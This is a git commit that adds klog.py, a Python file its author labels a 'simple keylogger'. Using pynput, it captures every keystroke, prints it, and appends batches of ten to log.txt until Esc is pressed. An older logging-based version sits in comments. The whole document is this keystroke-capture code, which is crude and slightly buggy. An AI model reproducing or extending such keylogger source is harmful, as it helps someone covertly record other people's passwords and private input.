d6bb62c7e9a9363b8f432deb573cf363b37e8ea9
Shyrtle <joshyxboy@gmail.com>
2018-09-16 13:46:11 -0800

    simple keylogger first commit

---
+++ klog.py
@@ -0,0 +1,42 @@
+from pynput.keyboard import Key, Listener
+
+# log_dir = ""
+#
+# log.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+#
+# def on_press(key):
+#     logging.info(str(key))
+#
+# with Listener(on_press=on_press) as listener:
+#     listener.join()
+
+count = 0
+keys = []
+
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(str(keys))
+        keys = []
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
